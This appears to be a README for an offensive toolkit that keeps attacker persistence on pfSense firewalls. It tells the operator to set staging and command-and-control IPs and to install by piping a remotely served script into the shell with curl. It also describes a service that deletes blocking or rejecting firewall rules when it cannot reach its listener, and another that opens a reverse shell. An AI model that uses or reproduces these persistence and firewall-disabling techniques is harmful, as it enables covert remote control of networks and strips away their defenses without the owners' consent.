# pfSensePersistence
A collection of pfsense persistence tools

## Install
Run install.sh to install Breakout and Service Shell. Set staging IP(machine serving files) and C2 IP(server to connect back to). Assumed to be serving files with ```python -m http.server```
Recommend to pipe directly to shell, ie ```curl -s <IP>:8000/install.sh | sh```

## Breakout
Service that will check if it can connect back to the listener periodically. If it can't, it will delete any filter rules that block or reject traffic

## Service Shell
Basic service to make a reverse shell